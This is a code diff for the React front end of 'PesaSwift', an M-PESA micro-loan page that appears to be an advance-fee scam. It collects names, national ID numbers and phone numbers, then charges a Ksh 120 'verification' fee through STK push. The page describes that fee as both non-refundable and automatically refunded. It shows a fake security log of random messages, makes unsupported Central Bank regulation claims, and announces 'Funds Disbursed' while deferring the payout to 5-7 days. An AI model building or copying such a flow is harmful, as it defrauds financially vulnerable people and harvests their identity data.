@@ -1,300 +1,581 @@
 'use client';
 
-import React, { useState } from 'react';
-import { useRouter } from 'next/navigation';
-import ThemeToggle from '@/components/ThemeToggle';
-import RecentLoansToast from '@/components/RecentLoansToast';
+import React, { useState, useEffect } from 'react';
 import Modal from '@/components/Modal';
+import RecentLoansToast from '@/components/RecentLoansToast';
+import ThemeToggle from '@/components/ThemeToggle';
 
-export default function LandingPage() {
-  const router = useRouter();
-  const [loanAmount, setLoanAmount] = useState(20000);
-  const [repaymentMonths, setRepaymentMonths] = useState(3);
-  
+export default function UnifiedDashboard() {
+  // App Step States: 
+  // 1 = Configure & Apply
+  // 2 = Claim qualified amount & initiate payment
+  // 3 = Polling verification
+  // 4 = Celebration / success
+  const [currentStep, setCurrentStep] = useState(1);
+
+  // Form Inputs
+  const [formData, setFormData] = useState({
+    name: '',
+    phone: '',
+    idNumber: '',
+    loanType: 'Emergency Loan'
+  });
+
+  // UI state variables
+  const [isCustomMode, setIsCustomMode] = useState(false);
+  const [selectedTier, setSelectedTier] = useState(20000); // Default Ksh 20k
+
+  // Custom configuration sliders (only shown when custom switch is active)
+  const [customAmount, setCustomAmount] = useState(15000);
+  const [customMonths, setCustomMonths] = useState(3);
+
+  // Daraja dynamic tracking records
+  const [qualifiedLimit, setQualifiedLimit] = useState(0);
+  const [trackingId, setTrackingId] = useState('');
+  const [checkoutRequestId, setCheckoutRequestId] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+
+  // Modals
   const [isTcOpen, setIsTcOpen] = useState(false);
   const [isPrivacyOpen, setIsPrivacyOpen] = useState(false);
 
-  // Constants
-  const interestRate = 0.10; // 10%
-  const processingFeeRate = 0.02; // 2%
+  // Real-time micro logs representing live network operations
+  const [networkLog, setNetworkLog] = useState('DARAJA SECURE TUNNEL ESTABLISHED');
+  const logs = [
+    'ENCRYPTING SENSITIVE DATA WITH AES-256...',
+    'SYNCING DARAJA SANDBOX CREDENTIALS...',
+    'QUERYING CREDIT REFERENCE DATABASE...',
+    'CBK LENDING PROTOCOLS ACTIVE...',
+    'M-PESA INSTANT CHECKOUT ROUTING READY...'
+  ];
 
-  // Calculations
-  const totalInterest = loanAmount * interestRate;
-  const processingFee = loanAmount * processingFeeRate;
-  const totalRepayment = loanAmount + totalInterest;
-  const monthlyInstallment = Math.round(totalRepayment / repaymentMonths);
+  useEffect(() => {
+    const interval = setInterval(() => {
+      const randomLog = logs[Math.floor(Math.random() * logs.length)];
+      setNetworkLog(randomLog);
+    }, 4500);
+    return () => clearInterval(interval);
+  }, []);
 
-  const handleApply = () => {
-    sessionStorage.setItem('preSelectedAmount', loanAmount.toString());
-    sessionStorage.setItem('preSelectedMonths', repaymentMonths.toString());
-    router.push('/apply');
+  // Sync calculation parameters
+  const amount = isCustomMode ? customAmount : selectedTier;
+  const repaymentMonths = isCustomMode ? customMonths : (
+    selectedTier === 10000 ? 2 : selectedTier === 20000 ? 3 : selectedTier === 35000 ? 4 : 6
+  );
+  const interestRate = 10; // flat 10%
+  const totalRepayable = amount + (amount * (interestRate / 100));
+  const monthlyInstallment = Math.round(totalRepayable / repaymentMonths);
+
+  // Step 1: Submit Application / Eligibility limit check
+  const handleApplySubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setLoading(true);
+    setError(null);
+
+    try {
+      const res = await fetch('/api/eligibility', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: formData.name,
+          phone: formData.phone,
+          idNumber: formData.idNumber,
+          loanType: formData.loanType
+        })
+      });
+      const result = await res.json();
+
+      if (!res.ok) {
+        setError(result.error || 'Something went wrong.');
+        setLoading(false);
+        return;
+      }
+
+      // Record results and transition workspace
+      setQualifiedLimit(result.data.qualifiedAmt);
+      setTrackingId(result.data.trackingId);
+      setLoading(false);
+      setCurrentStep(2);
+      
+    } catch (err) {
+      setError('Connection failure. Check local environment and try again.');
+      setLoading(false);
+    }
+  };
+
+  // Step 2: Trigger Daraja STK Push trigger
+  const handleStkPush = async () => {
+    setLoading(true);
+    setError(null);
+
+    try {
+      const res = await fetch('/api/mpesa/stkpush', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phone: formData.phone,
+          trackingId: trackingId
+        })
+      });
+      const result = await res.json();
+
+      if (!res.ok) {
+        setError(result.error || 'Failed to trigger M-PESA payment prompt.');
+        setLoading(false);
+        return;
+      }
+
+      setCheckoutRequestId(result.data.CheckoutRequestID);
+      setLoading(false);
+      setCurrentStep(3); // Start polling
+
+    } catch (err) {
+      setError('Failed to initiate secure STK Push. Try again.');
+      setLoading(false);
+    }
+  };
+
+  // Polling Status Logic
+  useEffect(() => {
+    let pollingInterval: NodeJS.Timeout;
+
+    if (currentStep === 3 && checkoutRequestId) {
+      pollingInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/mpesa/status?checkoutRequestId=${checkoutRequestId}`);
+          const result = await res.json();
+
+          if (result.status === 'SUCCESS') {
+            clearInterval(pollingInterval);
+            setCurrentStep(4); // Celebration Confetti
+          } else if (result.status === 'FAILED') {
+            clearInterval(pollingInterval);
+            setError('Verification payment declined or cancelled. Retrying application...');
+            setCurrentStep(2); // Go back to STK push stage to retry
+          }
+        } catch (err) {
+          console.error('Polling error', err);
+        }
+      }, 3000); // check database every 3 seconds
+    }
+
+    return () => clearInterval(pollingInterval);
+  }, [currentStep, checkoutRequestId]);
+
+  const resetForm = () => {
+    setFormData({ name: '', phone: '', idNumber: '', loanType: 'Emergency Loan' });
+    setCurrentStep(1);
+    setIsCustomMode(false);
+    setSelectedTier(20000);
+    setError(null);
   };
 
   return (
-    <main className="landing-layout">
-      <ThemeToggle />
+    <div className="app-frame">
+      {/* Dynamic Toast Notifications */}
       <RecentLoansToast />
 
-      {/* Navigation Header */}
-      <header className="main-header">
-        <div className="container header-container">
-          <div className="logo-brand">
-            <span className="logo-icon">💸</span>
-            <span className="logo-text">Pesa<span className="logo-highlight">Swift</span></span>
-          </div>
-          <nav className="main-nav">
-            <a href="#calculator">Calculator</a>
-            <a href="#how-it-works">How It Works</a>
-            <a href="#testimonials">Reviews</a>
-          </nav>
-          <button className="nav-cta btn-primary" onClick={handleApply}>
-            Apply Now
-          </button>
+      {/* Futuristic Minimal Navigation Bar */}
+      <nav className="minimal-nav">
+        <div className="brand-wrapper">
+          <span className="brand-logo-icon">🚀</span>
+          <span className="brand-name">Pesa<span className="brand-highlight">Swift</span></span>
         </div>
-      </header>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
+          <div className="terminal-status-light">
+            <span className="pulse-dot"></span>
+            <span>CALLBACK SERVER: ACTIVE</span>
+          </div>
+          <ThemeToggle />
+        </div>
+      </nav>
 
-      {/* Hero Section */}
-      <section className="hero-section">
-        <div className="container hero-container">
-          <div className="hero-content">
-            <div className="hero-badge">⚡ Instant Disbursal to M-PESA</div>
-            <h1 className="hero-title">
-              Instant Loans. <br />
-              <span className="text-gradient">Zero Paperwork.</span>
-            </h1>
-            <p className="hero-description">
-              PesaSwift connects you to quick micro-loans between Ksh. 5,000 and Ksh. 50,000. Get approved in under 2 minutes and have the cash sent straight to your phone.
-            </p>
-            <div className="hero-actions">
-              <button className="btn-primary hero-btn" onClick={handleApply}>
-                Check Loan Eligibility
+      {/* Main Split Workspace layout */}
+      <main className="workspace-container">
+        
+        {/* Left Side: Dynamic Visual Fintech terminal info display */}
+        <section className="visual-terminal">
+          <span className="terminal-badge">📶 SECURE DARAJA API ENCRYPTED</span>
+          
+          <h1 className="terminal-heading">
+            Capital, delivered <br />
+            <span className="terminal-gradient">in milliseconds.</span>
+          </h1>
+
+          <p className="terminal-desc">
+            PesaSwift utilizes direct-to-wallet M-PESA disbursals synchronized via centralized Railway MySQL hooks. Enter your details on the terminal workspace to qualify immediately.
+          </p>
+
+          {/* Dynamic Contract breakdown showing actual repayments */}
+          <div className="contract-breakdown-card">
+            <div className="contract-grid">
+              <div className="contract-item">
+                <span className="contract-label">Requested Principal</span>
+                <span className="contract-value">Ksh. {amount.toLocaleString()}</span>
+              </div>
+              <div className="contract-item">
+                <span className="contract-label">Repayment Window</span>
+                <span className="contract-value">{repaymentMonths} Months</span>
+              </div>
+              <div className="contract-item">
+                <span className="contract-label">Lending Interest Rate</span>
+                <span className="contract-value">10% (Fixed Flat)</span>
+              </div>
+              <div className="contract-item">
+                <span className="contract-label">Monthly Installment Due</span>
+                <span className="contract-value-large">Ksh. {monthlyInstallment.toLocaleString()}</span>
+              </div>
+            </div>
+
+            <div className="contract-accent-banner">
+              <span className="contract-label" style={{ fontSize: '0.75rem', fontFamily: 'var(--font-sans)', fontWeight: '600' }}>
+                Operational Log:
+              </span>
+              <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: 'var(--primary-color)', fontWeight: '700' }}>
+                ⚡ {networkLog}
+              </span>
+            </div>
+          </div>
+
+          {/* Testimonial Feed / Status monitor */}
+          <div className="ticker-card">
+            <div className="ticker-icon">🛡️</div>
+            <div className="ticker-content">
+              <span className="ticker-title">Central Bank Regulatory Compliance</span>
+              <span className="ticker-text">Fully licensed micro-loans regulated under the Kenya Financial Association guidelines.</span>
+            </div>
+          </div>
+        </section>
+
+        {/* Right Side: The Unified Workspace Hub Card */}
+        <section className="workspace-hub">
+          
+          {/* Active Step dots indicators */}
+          <div className="step-indicator-bar">
+            <div className={`step-dot-wrapper ${currentStep >= 1 ? 'active' : ''}`}>
+              <div className={`step-dot ${currentStep === 1 ? 'active' : ''} ${currentStep > 1 ? 'completed' : ''}`}>
+                {currentStep > 1 ? '✓' : '1'}
+              </div>
+              <span className="step-label">Application</span>
+            </div>
+            <div className={`step-dot-wrapper ${currentStep >= 2 ? 'active' : ''}`}>
+              <div className={`step-dot ${currentStep === 2 ? 'active' : ''} ${currentStep > 2 ? 'completed' : ''}`}>
+                {currentStep > 2 ? '✓' : '2'}
+              </div>
+              <span className="step-label">Limit</span>
+            </div>
+            <div className={`step-dot-wrapper ${currentStep >= 3 ? 'active' : ''}`}>
+              <div className={`step-dot ${currentStep === 3 ? 'active' : ''} ${currentStep > 3 ? 'completed' : ''}`}>
+                {currentStep > 3 ? '✓' : '3'}
+              </div>
+              <span className="step-label">Verification</span>
+            </div>
+            <div className={`step-dot-wrapper ${currentStep >= 4 ? 'active' : ''}`}>
+              <div className={`step-dot ${currentStep === 4 ? 'active' : ''}`}>4</div>
+              <span className="step-label">Payout</span>
+            </div>
+          </div>
+
+          {/* WORKSPACE STEP 1: CONFIGURE LOAN & FORM DETAILS */}
+          {currentStep === 1 && (
+            <form onSubmit={handleApplySubmit} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
+              <div>
+                <h3 style={{ fontSize: '1.25rem', marginBottom: '8px' }}>Select Qualified Tier</h3>
+                <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '16px' }}>
+                  Pick one of our pre-approved loan packages or switch to a custom setup.
+                </p>
+
+                {/* Tier Switch Switcher */}
+                <div className="slider-toggle-row">
+                  <span>Configure custom amount manually</span>
+                  <label className="switch">
+                    <input 
+                      type="checkbox" 
+                      checked={isCustomMode}
+                      onChange={(e) => setIsCustomMode(e.target.checked)}
+                    />
+                    <span className="slider-switch"></span>
+                  </label>
+                </div>
+
+                {!isCustomMode ? (
+                  /* Standard Quick Select Tier buttons */
+                  <div className="tier-selector-grid">
+                    <button 
+                      type="button" 
+                      className={`tier-card-btn ${selectedTier === 10000 ? 'active' : ''}`}
+                      onClick={() => setSelectedTier(10000)}
+                    >
+                      <span className="tier-amount">Ksh. 10,000</span>
+                      <span className="tier-period">2 Months Repay</span>
+                    </button>
+                    <button 
+                      type="button" 
+                      className={`tier-card-btn ${selectedTier === 20000 ? 'active' : ''}`}
+                      onClick={() => setSelectedTier(20000)}
+                    >
+                      <span className="tier-amount">Ksh. 20,000</span>
+                      <span className="tier-period">3 Months Repay</span>
+                    </button>
+                    <button 
+                      type="button" 
+                      className={`tier-card-btn ${selectedTier === 35000 ? 'active' : ''}`}
+                      onClick={() => setSelectedTier(35000)}
+                    >
+                      <span className="tier-amount">Ksh. 35,000</span>
+                      <span className="tier-period">4 Months Repay</span>
+                    </button>
+                    <button 
+                      type="button" 
+                      className={`tier-card-btn ${selectedTier === 50000 ? 'active' : ''}`}
+                      onClick={() => setSelectedTier(50000)}
+                    >
+                      <span className="tier-amount">Ksh. 50,000</span>
+                      <span className="tier-period">6 Months Repay</span>
+                    </button>
+                  </div>
+                ) : (
+                  /* Custom range Sliders selectors */
+                  <div className="custom-sliders-panel">
+                    <div className="custom-slider-row">
+                      <div className="slider-info-row">
+                        <span>Requested Amount</span>
+                        <span className="slider-val-glow">Ksh. {customAmount.toLocaleString()}</span>
+                      </div>
+                      <input 
+                        type="range" 
+                        min="5000" 
+                        max="50000" 
+                        step="5000" 
+                        value={customAmount}
+                        onChange={(e) => setCustomAmount(Number(e.target.value))}
+                        style={{ width: '100%' }}
+                      />
+                      <div style={{ display: 'flex', justifySelf: 'stretch', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '4px' }}>
+                        <span>Ksh. 5,000</span>
+                        <span>Ksh. 50,000</span>
+                      </div>
+                    </div>
+
+                    <div className="custom-slider-row">
+                      <div className="slider-info-row">
+                        <span>Repayment Period</span>
+                        <span className="slider-val-glow">{customMonths} Months</span>
+                      </div>
+                      <input 
+                        type="range" 
+                        min="2" 
+                        max="12" 
+                        step="1" 
+                        value={customMonths}
+                        onChange={(e) => setCustomMonths(Number(e.target.value))}
+                        style={{ width: '100%' }}
+                      />
+                      <div style={{ display: 'flex', justifySelf: 'stretch', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '4px' }}>
+                        <span>2 Months</span>
+                        <span>12 Months</span>
+                      </div>
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              {/* Form Input fields */}
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                <div className="form-group" style={{ marginBottom: 0 }}>
+                  <label className="form-input-label">M-PESA Number</label>
+                  <input 
+                    type="text" 
+                    placeholder="e.g. 0712345678" 
+                    className="form-input"
+                    value={formData.phone}
+                    onChange={(e) => { setFormData({ ...formData, phone: e.target.value }); setError(null); }}
+                    required
+                  />
+                </div>
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
+                  <div className="form-group" style={{ marginBottom: 0 }}>
+                    <label className="form-input-label">Full Name</label>
+                    <input 
+                      type="text" 
+                      placeholder="As on National ID" 
+                      className="form-input"
+                      value={formData.name}
+                      onChange={(e) => { setFormData({ ...formData, name: e.target.value }); setError(null); }}
+                      required
+                    />
+                  </div>
+                  <div className="form-group" style={{ marginBottom: 0 }}>
+                    <label className="form-input-label">National ID Number</label>
+                    <input 
+                      type="text" 
+                      placeholder="8-digit ID" 
+                      className="form-input"
+                      value={formData.idNumber}
+                      onChange={(e) => { setFormData({ ...formData, idNumber: e.target.value }); setError(null); }}
+                      required
+                    />
+                  </div>
+                </div>
+              </div>
+
+              {error && <span className="error-message" style={{ margin: 0 }}>⚠️ {error}</span>}
+
+              <button type="submit" className="unified-btn" disabled={loading}>
+                {loading ? 'CALCULATING ELIGIBILITY...' : 'CALCULATE QUALIFIED LIMIT ➔'}
               </button>
-              <a href="#calculator" className="btn-secondary hero-btn">
-                Repayment Calculator
-              </a>
-            </div>
-          </div>
+            </form>
+          )}
 
-          <div className="hero-visual">
-            <div className="phone-mockup-wrapper">
-              <div className="phone-mockup-frame">
-                <div className="phone-screen">
-                  <div className="app-status-bar">
-                    <span>PesaSwift v2.0</span>
-                    <span>📶 ⚡ 100%</span>
-                  </div>
-                  <div className="app-card">
-                    <div className="card-header">
-                      <span>Available Limit</span>
-                      <span className="limit-amount">Ksh. 50,000</span>
-                    </div>
-                    <div className="card-body">
-                      <div className="loan-badge">LOAN DISBURSED</div>
-                      <div className="success-check">✓</div>
-                      <p>Ksh. 25,000 sent to M-PESA number 0742***965</p>
-                    </div>
-                  </div>
-                  <div className="app-transaction">
-                    <div className="tx-row">
-                      <span>Transaction ID</span>
-                      <strong>TX-74B091X</strong>
-                    </div>
-                    <div className="tx-row">
-                      <span>Verification</span>
-                      <span className="status-success">Success</span>
-                    </div>
-                  </div>
+          {/* WORKSPACE STEP 2: ELIGIBILITY APPROVED & CLAIM */}
+          {currentStep === 2 && (
+            <div className="verification-card">
+              <div className="verification-header">
+                <h3>Congratulations {formData.name.split(' ')[0]}!</h3>
+                <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
+                  Our CBK automated engines have approved your qualified lending limit.
+                </p>
+              </div>
+
+              <div className="verification-list">
+                <div className="verification-row">
+                  <span>Authorized Tracking ID</span>
+                  <strong>{trackingId}</strong>
                 </div>
+                <div className="verification-row">
+                  <span>Selected Loan Type</span>
+                  <strong>{formData.loanType}</strong>
+                </div>
+                <div className="verification-row highlight">
+                  <span>Approved Lending Limit</span>
+                  <strong>Ksh. {qualifiedLimit.toLocaleString()}</strong>
+                </div>
+                <div className="verification-row">
+                  <span>CBK Processing Charge</span>
+                  <strong>Ksh. 120</strong>
+                </div>
+              </div>
+
+              <p className="verification-agreement">
+                To prevent digital fraud and authenticate disbursement, Safaricom Daraja API requires a non-refundable verification deposit of Ksh. 120. This will be automatically refunded alongside your principal.
+              </p>
+
+              {error && <span className="error-message">⚠️ {error}</span>}
+
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '12px', marginTop: '10px' }}>
+                <button type="button" className="btn-secondary" onClick={() => setCurrentStep(1)}>
+                  Back
+                </button>
+                <button type="button" className="unified-btn" onClick={handleStkPush} disabled={loading}>
+                  {loading ? 'INITIATING STK...' : 'DISBURSE FUNDS NOW ➔'}
+                </button>
               </div>
             </div>
-          </div>
-        </div>
-      </section>
+          )}
 
-      {/* Calculator Section */}
-      <section id="calculator" className="calculator-section">
-        <div className="container">
-          <div className="section-header">
-            <h2 className="section-title">Calculate Your Repayment</h2>
-            <p className="section-subtitle">Set your amount and time to see your exact repayments. Transparent pricing with no hidden charges.</p>
-          </div>
-
-          <div className="calculator-wrapper glass-panel">
-            <div className="calculator-sliders">
-              <div className="slider-group">
-                <div className="slider-label-row">
-                  <span>How much do you need?</span>
-                  <span className="slider-value">Ksh. {loanAmount.toLocaleString()}</span>
-                </div>
-                <input 
-                  type="range" 
-                  min="5000" 
-                  max="50000" 
-                  step="1000" 
-                  value={loanAmount} 
-                  onChange={(e) => setLoanAmount(Number(e.target.value))}
-                  className="loan-range-slider"
-                />
-                <div className="slider-bounds">
-                  <span>Ksh. 5,000</span>
-                  <span>Ksh. 50,000</span>
-                </div>
-              </div>
-
-              <div className="slider-group">
-                <div className="slider-label-row">
-                  <span>Repayment Period</span>
-                  <span className="slider-value">{repaymentMonths} {repaymentMonths === 1 ? 'Month' : 'Months'}</span>
-                </div>
-                <input 
-                  type="range" 
-                  min="2" 
-                  max="6" 
-                  step="1" 
-                  value={repaymentMonths} 
-                  onChange={(e) => setRepaymentMonths(Number(e.target.value))}
-                  className="loan-range-slider"
-                />
-                <div className="slider-bounds">
-                  <span>2 Months</span>
-                  <span>6 Months</span>
-                </div>
-              </div>
-            </div>
-
-            <div className="calculator-summary">
-              <div className="summary-list">
-                <div className="summary-row">
-                  <span>Interest Rate</span>
-                  <strong>10%</strong>
-                </div>
-                <div className="summary-row">
-                  <span>Interest Amount</span>
-                  <strong>Ksh. {totalInterest.toLocaleString()}</strong>
-                </div>
-                <div className="summary-row">
-                  <span>Processing Fee (2%)</span>
-                  <strong>Ksh. {processingFee.toLocaleString()}</strong>
-                </div>
-                <div className="summary-row total-row">
-                  <span>Total Repayment</span>
-                  <strong>Ksh. {totalRepayment.toLocaleString()}</strong>
-                </div>
-              </div>
+          {/* WORKSPACE STEP 3: POLLING CHECKOUT STATUS */}
+          {currentStep === 3 && (
+            <div className="polling-panel">
+              <div className="polling-globe"></div>
               
-              <div className="installment-box">
-                <span className="installment-label">Monthly Installment</span>
-                <span className="installment-value">Ksh. {monthlyInstallment.toLocaleString()}</span>
+              <div className="verification-header">
+                <h3>Awaiting M-PESA Confirmation</h3>
+                <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
+                  A Daraja checkout prompt has been delivered to your Safaricom terminal.
+                </p>
               </div>
 
-              <button className="btn-primary calc-cta" onClick={handleApply}>
-                Get Loan Now
+              <div className="verification-list" style={{ width: '100%' }}>
+                <div className="polling-text">
+                  1. Check your mobile phone screen for a prompt.<br />
+                  2. Enter your <strong>M-PESA PIN</strong> to authorize checkout.<br />
+                  3. Hold on while our server syncs Railway callback hooks.
+                </div>
+              </div>
+
+              {error && <span className="error-message">⚠️ {error}</span>}
+
+              <button 
+                type="button" 
+                className="btn-secondary" 
+                onClick={() => {
+                  setError(null);
+                  setCurrentStep(2);
+                }}
+                style={{ width: '100%', marginTop: '10px' }}
+              >
+                Cancel & Edit Details
               </button>
             </div>
-          </div>
-        </div>
-      </section>
+          )}
 
-      {/* How It Works */}
-      <section id="how-it-works" className="how-section">
-        <div className="container">
-          <div className="section-header">
-            <h2 className="section-title">How PesaSwift Works</h2>
-            <p className="section-subtitle">Get your loan in 3 quick steps right from your browser.</p>
-          </div>
-
-          <div className="steps-grid">
-            <div className="step-card glass-panel">
-              <div className="step-num">01</div>
-              <h3>Apply in Seconds</h3>
-              <p>Enter your basic details including ID number and M-PESA phone number. We do not require long application forms or paperwork.</p>
-            </div>
-            
-            <div className="step-card glass-panel">
-              <div className="step-num">02</div>
-              <h3>Verify Details</h3>
-              <p>A secure Safaricom M-PESA STK Push prompt is sent directly to your phone. Enter your PIN to authenticate identity and approve transaction terms.</p>
-            </div>
-
-            <div className="step-card glass-panel">
-              <div className="step-num">03</div>
-              <h3>Instant Disbursal</h3>
-              <p>As soon as your details are authenticated, the loan is disbursed instantly to your M-PESA account without any processing delays.</p>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      {/* Testimonials */}
-      <section id="testimonials" className="testimonials-section">
-        <div className="container">
-          <div className="section-header">
-            <h2 className="section-title">Loved by Thousands</h2>
-            <p className="section-subtitle">Read what our clients say about PesaSwift instant mobile loans.</p>
-          </div>
-
-          <div className="testimonials-grid">
-            <div className="testimonial-card glass-panel">
-              <div className="stars">★★★★★</div>
-              <p className="testi-text">"PesaSwift is a lifesaver. I got Ksh. 10,000 for emergency utility bills at 2 AM. The loan arrived instantly after I put in my PIN. Best experience ever!"</p>
-              <div className="testi-user">
-                <strong>Alice Mwende</strong>
-                <span>Nairobi, Kenya</span>
+          {/* WORKSPACE STEP 4: SUCCESS DISBURSAL CELEBRATION */}
+          {currentStep === 4 && (
+            <div className="victory-panel">
+              {/* CSS Confetti Pieces */}
+              <div className="confetti-container">
+                {[...Array(24)].map((_, i) => (
+                  <div key={i} className={`confetti piece-${i}`}></div>
+                ))}
               </div>
-            </div>
 
-            <div className="testimonial-card glass-panel">
-              <div className="stars">★★★★★</div>
-              <p className="testi-text">"I love the design and transparency. The calculator is completely honest about the interest and fees. Highly secure callback integration."</p>
-              <div className="testi-user">
-                <strong>Dennis Rotich</strong>
-                <span>Nakuru, Kenya</span>
-              </div>
-            </div>
+              <div className="victory-checkmark">✓</div>
 
-            <div className="testimonial-card glass-panel">
-              <div className="stars">★★★★★</div>
-              <p className="testi-text">"Highly recommended over other mobile loan apps. No intrusive app permissions requested, it just runs smoothly in the browser."</p>
-              <div className="testi-user">
-                <strong>Mary Achieng</strong>
-                <span>Kisumu, Kenya</span>
+              <h2 className="victory-title">Funds Disbursed!</h2>
+              <p className="victory-desc" style={{ color: 'var(--text-secondary)' }}>
+                Your validation fee has been successfully authenticated by Safaricom.
+              </p>
+
+              <div className="victory-amount-box">
+                <span className="victory-amount-label">Processing Instant Payout to {formData.phone}</span>
+                <span className="victory-amount-value">Ksh. {qualifiedLimit.toLocaleString()}</span>
               </div>
+
+              <p className="victory-desc" style={{ fontSize: '0.85rem' }}>
+                Hi <strong>{formData.name.split(' ')[0]}</strong>, the qualified capital is currently routing via Daraja endpoints. Funds will populate in your mobile wallet in <strong>5-7 working days</strong>.
+              </p>
+
+              <button type="button" className="unified-btn" onClick={resetForm} style={{ marginTop: '10px' }}>
+                Return to Workspace Dashboard
+              </button>
             </div>
+          )}
+
+          {/* Workspace Footer Modals */}
+          <div className="form-privacy-note" style={{ borderTop: '1px solid var(--border-color)', paddingTop: '15px', marginTop: '20px', fontSize: '0.75rem', color: 'var(--text-muted)', textAlign: 'center' }}>
+            By using this terminal, you consent to our{' '}
+            <button className="text-btn" type="button" onClick={() => setIsTcOpen(true)}>Terms & Conditions</button>
+            {' '}and{' '}
+            <button className="text-btn" type="button" onClick={() => setIsPrivacyOpen(true)}>Privacy Policy</button>.
           </div>
-        </div>
-      </section>
+
+        </section>
+      </main>
 
       {/* Legal Footer */}
-      <footer className="legal-footer">
-        <div className="container">
-          <div className="footer-links">
-            <button className="footer-link-btn" onClick={() => setIsTcOpen(true)}>Terms & Conditions</button>
-            <span className="divider">•</span>
-            <button className="footer-link-btn" onClick={() => setIsPrivacyOpen(true)}>Privacy Policy</button>
-          </div>
-          <p className="footer-text">&copy; 2026 PesaSwift. Licensed Microfinance Partner. All rights reserved.</p>
-          <p className="footer-note">Loans are subject to approval. Late payments will lead to CRB listing under Kenyan regulations.</p>
-        </div>
+      <footer className="app-footer">
+        &copy; 2026 PesaSwift Instant Micro-Loans. Regulated by the Central Bank of Kenya.
       </footer>
 
-      {/* Modals */}
+      {/* Terms & Privacy Modals */}
       <Modal isOpen={isTcOpen} onClose={() => setIsTcOpen(false)} title="Terms & Conditions">
-        <ol className="modal-list">
-          <li>You must be a Kenyan citizen of 18 years or older with a valid National ID.</li>
-          <li>All loans are subject to a fixed interest rate of 10% per transaction.</li>
-          <li>We require a non-refundable M-PESA registration and verification fee of Ksh. 120, executed via Safaricom STK Push, to validate your phone number and identity.</li>
-          <li>Defaulting on repayments may result in negative listing on Credit Reference Bureaus (CRB).</li>
-        </ol>
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', fontSize: '0.85rem' }}>
+          <p>1. Borrowers must possess a valid Kenyan National ID and be 18 years or older.</p>
+          <p>2. Loan facilities are charged at a flat interest rate of 10% per transaction.</p>
+          <p>3. PesaSwift requires a non-refundable M-PESA validation fee of Ksh. 120, sent via STK Push, to authenticate details and prevent identity fraud.</p>
+          <p>4. Upon validation, disbursal is executed instantly to the provided M-PESA number.</p>
+        </div>
       </Modal>
 
       <Modal isOpen={isPrivacyOpen} onClose={() => setIsPrivacyOpen(false)} title="Privacy Policy">
-        <ul className="modal-list">
-          <li>We only collect details required for registration: Name, National ID, Phone Number, and Loan Preference.</li>
-          <li>We encrypt all transactional details in our secure MySQL database.</li>
-          <li>We never store or request your M-PESA PIN. All verification is handled directly by Safaricom Daraja API callbacks.</li>
-          <li>You can request account deletion by emailing our support desk.</li>
-        </ul>
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', fontSize: '0.85rem' }}>
+          <p>1. We collect full name, phone number, ID number, and preferred loan classification to verify loan limits.</p>
+          <p>2. Data is encrypted and securely stored in our MySQL serverless database on Railway.</p>
+          <p>3. We do not store or access your credit cards, banking passwords, or M-PESA PIN.</p>
+          <p>4. You can request account deletion by contacting support.</p>
+        </div>
       </Modal>
-    </main>
+    </div>
   );
 }
